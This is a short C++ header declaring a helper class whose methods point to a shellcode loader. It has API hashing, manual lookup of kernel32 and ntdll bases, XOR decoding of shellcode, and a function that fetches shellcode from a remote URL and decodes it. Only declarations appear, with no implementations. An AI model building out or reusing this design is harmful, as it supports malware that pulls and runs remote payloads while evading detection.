#pragma once
#include "def.h"

#include <string>
#include <vector>
#include "http.hpp"

class helper {

public:
    unsigned long simpleHash(const std::string& input);
    PVOID GetModuleBase(const wchar_t* moduleName);
    static void xor_decode(char* data, int len, char key);

    static void xor_shellcode(unsigned char* data, int len, unsigned char shellcode_key);



    unsigned char* getKernel32();
    

    unsigned char* getNtdll();
    std::vector<unsigned char> fetchRemoteShellcodeAndDecode(const std::wstring& url, const std::wstring& file, unsigned char shellcode_key);
   
};

extern helper helperHandler;